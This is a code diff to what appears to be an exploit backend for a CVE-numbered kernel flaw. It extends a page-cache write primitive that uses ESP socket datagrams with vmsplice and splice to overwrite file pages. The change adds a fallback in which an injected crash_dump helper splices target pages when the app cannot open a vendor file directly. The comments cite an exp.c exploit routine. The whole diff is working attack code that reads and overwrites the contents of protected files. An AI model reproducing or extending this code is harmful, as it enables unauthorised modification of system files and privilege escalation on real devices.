@@ -19,11 +19,15 @@ namespace ghostlock::backend::cve_2026_43284 {
         constexpr std::size_t kIcvScratchBytes = kEspIcvMaxBytes;
 
         /* Availability is derived, never stored: a usable session needs a fully
-         * bound syscall surface, both fds and a valid ICV truncation length. */
+         * bound syscall surface, a connected ESP socket, a valid ICV truncation
+         * length and a ciphertext page source. That source is either the direct
+         * file_fd splice or, when the App cannot open the vendor file at all,
+         * the injected crash_dump helper write source. */
         [[nodiscard]] bool page_cache_ready(const PageCacheWriteContext &ctx) noexcept {
             const std::size_t icv_len = static_cast<std::size_t>(ctx.sa.icv_len);
-            return ctx.io.available() && ctx.file_fd >= 0 && ctx.socket_fd >= 0 &&
-                   icv_len != 0U && icv_len <= kEspIcvMaxBytes;
+            return ctx.io.available() && ctx.socket_fd >= 0 && icv_len != 0U &&
+                   icv_len <= kEspIcvMaxBytes &&
+                   (ctx.file_fd >= 0 || ctx.helper_write.available());
         }
 
         void store_be32(std::uint8_t *out, std::uint32_t value) noexcept {
@@ -118,19 +122,47 @@ namespace ghostlock::backend::cve_2026_43284 {
             return WriteResult::InvalidArgument;
         }
 
+        /* Primary source: the direct file_fd pread. Its failure is remembered
+         * so an unbound old_page keeps the exact prior return code. */
+        WriteResult direct = WriteResult::Ok;
         std::size_t done = 0U;
         while (done < kPageCacheBlockBytes) {
             const std::size_t remaining = kPageCacheBlockBytes - done;
             const std::uint64_t at = file_offset + static_cast<std::uint64_t>(done);
             const long n = ctx.io.read_at(ctx.file_fd, out + done, remaining, at);
             if (n == -EINTR) continue;
-            if (n < 0) return WriteResult::IoError;
+            if (n < 0) {
+                direct = WriteResult::IoError;
+                break;
+            }
             const std::size_t got = static_cast<std::size_t>(n);
-            if (got == 0U) return WriteResult::ShortRead;
-            if (got > remaining) return WriteResult::IoError;
+            if (got == 0U) {
+                direct = WriteResult::ShortRead;
+                break;
+            }
+            if (got > remaining) {
+                direct = WriteResult::IoError;
+                break;
+            }
             done += got;
         }
-        return WriteResult::Ok;
+        if (done == kPageCacheBlockBytes) {
+            return WriteResult::Ok;
+        }
+
+        /* Vendor fallback: a direct read the App/shell cannot perform (or a
+         * file it cannot open at all) is retried through the injected source.
+         * The bridge is all-or-nothing: only a full 16-byte block counts, and
+         * every other outcome fails the block closed so no ESP datagram is
+         * emitted with a wrong IV/ICV. */
+        if (ctx.old_page.available()) {
+            const long n = ctx.old_page.read16(ctx.old_page.ctx, file_offset, out);
+            if (n == static_cast<long>(kPageCacheBlockBytes)) {
+                return WriteResult::Ok;
+            }
+            return n < 0 ? WriteResult::IoError : WriteResult::ShortRead;
+        }
+        return direct;
     }
 
     WriteResult write16(PageCacheWriteContext &ctx, std::uint64_t file_offset,
@@ -186,9 +218,24 @@ namespace ghostlock::backend::cve_2026_43284 {
         WriteResult result = vmsplice_all(ctx.io, fds[1], header_iv.data(),
                                           header_iv.size());
         if (result == WriteResult::Ok) {
-            std::uint64_t page_offset = file_offset;
-            result = splice_span(ctx.io, ctx.file_fd, &page_offset, fds[1],
-                                 kPageCacheBlockBytes);
+            if (ctx.file_fd >= 0) {
+                std::uint64_t page_offset = file_offset;
+                result = splice_span(ctx.io, ctx.file_fd, &page_offset, fds[1],
+                                     kPageCacheBlockBytes);
+            } else {
+                /* The App cannot open the vendor file: the patched helper
+                 * splice(2)s the target page into the same write pipe, behind
+                 * the header/IV the parent already placed there (exp.c
+                 * do_one_write_cbc use_helper=1). A short or failed helper is
+                 * fail-closed: the pipe is closed without a datagram. */
+                const long spliced = ctx.helper_write.splice16(
+                        ctx.helper_write.ctx, fds[1], file_offset);
+                if (spliced < 0) {
+                    result = WriteResult::IoError;
+                } else if (spliced != static_cast<long>(kPageCacheBlockBytes)) {
+                    result = WriteResult::ShortWrite;
+                }
+            }
         }
         if (result == WriteResult::Ok) {
             result = vmsplice_all(ctx.io, fds[1], icv.data(), icv_len);
